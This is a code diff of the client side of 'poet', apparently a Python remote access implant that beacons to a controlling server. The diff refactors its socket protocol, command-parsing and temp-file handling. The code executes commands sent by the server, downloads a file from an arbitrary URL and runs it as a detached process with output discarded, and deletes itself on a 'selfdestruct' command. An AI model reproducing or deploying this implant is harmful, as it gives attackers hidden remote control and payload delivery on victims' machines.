@@ -6,85 +6,19 @@ import sys
 import stat
 import time
 import zlib
-import base64
-import random
 import select
 import socket
-import struct
 import os.path
 import urllib2
 import argparse
+import tempfile
 import logging as log
 import subprocess as sp
 from datetime import datetime
 
-PREFIX_LEN = 4
-SIZE = 4096
+from poetsocket import *
+
 UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
-
-
-class PoetSocket(object):
-    """Socket wrapper for client/server communications.
-
-    Attributes:
-        s: socket instance
-
-    Socket abstraction which uses the convention that the message is prefixed
-    by a big-endian 32 bit value indicating the length of the following base64
-    string.
-    """
-
-    def __init__(self, s):
-        self.s = s
-
-    def close(self):
-        self.s.close()
-
-    def exchange(self, msg):
-        self.send(msg)
-        return self.recv()
-
-    def send(self, msg):
-        """Send message over socket."""
-
-        pkg = base64.b64encode(msg)
-        pkg_size = struct.pack('>i', len(pkg))
-        sent = self.s.sendall(pkg_size + pkg)
-        if sent:
-            raise socket.error('socket connection broken')
-
-    def recv(self):
-        """Receive message from socket.
-
-        Returns:
-            The message sent from client.
-        """
-
-        chunks = []
-        bytes_recvd = 0
-
-        # In case we don't get all 4 bytes of the prefix the first recv(),
-        # this ensures we'll eventually get it intact
-        while bytes_recvd < PREFIX_LEN:
-            chunk = self.s.recv(PREFIX_LEN)
-            if not chunk:
-                raise socket.error('socket connection broken')
-            chunks.append(chunk)
-            bytes_recvd += len(chunk)
-
-        initial = ''.join(chunks)
-        msglen, initial = (struct.unpack('>I', initial[:PREFIX_LEN])[0],
-                           initial[PREFIX_LEN:])
-        del chunks[:]
-        bytes_recvd = len(initial)
-        chunks.append(initial)
-        while bytes_recvd < msglen:
-            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
-            if not chunk:
-                raise socket.error('socket connection broken')
-            chunks.append(chunk)
-            bytes_recvd += len(chunk)
-        return base64.b64decode(''.join(chunks))
 
 
 class PoetSocketClient(PoetSocket):
@@ -137,9 +71,20 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
+                        # get filename based on if we're executing inside zip
+                        # file or not
+                        file = __file__.split('/')[0] if '.zip' in __file__ else __file__
+
+                        # if the flag to delete client on launch wasn't given
                         if not args.delete:
-                            os.remove(__file__)
-                        if __file__.strip('./') not in os.listdir('.'):
+                            os.remove(file)
+
+                        # check to make sure it's actually deleted
+                        # - the .strip('./') is for when we're executing as a
+                        #   regular file (no effect on zip file)
+                        # - the .split('/')[0] is for if we're in a zip file
+                        #   (no effect on regular file
+                        if file.strip('./').split('/')[0] not in os.listdir('.'):
                             s.send('boom')
                             sys.exit()
                         else:
@@ -171,7 +116,7 @@ class PoetClient(object):
         """
 
         out = ''
-        cmds = self.parse_exec_cmds(inp)
+        cmds = self.parse_exec_cmds(inp[5:])
         for cmd in cmds:
             cmd_out = self.cmd_exec(cmd)
             out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
@@ -187,16 +132,17 @@ class PoetClient(object):
     def dlexec(self, inp):
         """Handle server `dlexec' command.
 
-        Download file from internet, save to /tmp and execute.
+        Download file from internet, save to temp file, execute.
         """
 
         r = urllib2.urlopen(inp.split()[1])
-        rand = str(random.random())[2:6]
-        tmp = '/tmp/tmux-{}'.format(rand)
-        with open(tmp, 'w') as f:
+        with tempfile.NamedTemporaryFile(delete=False) as f:
             f.write(r.read())
             os.fchmod(f.fileno(), stat.S_IRWXU)
-        sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+        # intentionally not using sp.call() here because we don't
+        # necessarily want to wait() on the process. also, this is outside
+        # the with block to avoid a `Text file busy' error (linux)
+        sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
 
     def chint(self, s, inp):
         """Handle server `chint' command.
@@ -288,16 +234,15 @@ class PoetClient(object):
             List of commands to execute.
         """
 
-        cmds = []
-        inp = inp[5:]
-        num_cmds = inp.count('"') / 2
-        for i in range(num_cmds):
-            first = inp.find('"')
-            second = inp.find('"', first+1)
-            cmd = inp[first+1:second]
-            cmds.append(cmd)
-            inp = inp[second+2:]
-        return cmds
+        if inp.count('"') == 2:
+            return [inp[1:-1]]
+        else:
+            # server side regex guarantees that these quotes will be in the
+            # correct place -- the space between two commands
+            third_quote = inp.find('" "') + 2
+            first_cmd = inp[:third_quote-1]
+            rest = inp[third_quote:]
+            return [first_cmd[1:-1]] + self.parse_exec_cmds(rest)
 
 
 def get_args():
@@ -305,7 +250,8 @@ def get_args():
 
     parser = argparse.ArgumentParser()
     parser.add_argument('host', metavar='IP', type=str, help='server')
-    parser.add_argument('interval', metavar='INTERVAL', type=int, help='(s)')
+    parser.add_argument('interval', metavar='INTERVAL', type=int, help='(s)',
+                        nargs='?', default=600)
     parser.add_argument('-p', '--port')
     parser.add_argument('-v', '--verbose', action="store_true")
     parser.add_argument('-d', '--delete', action="store_true",
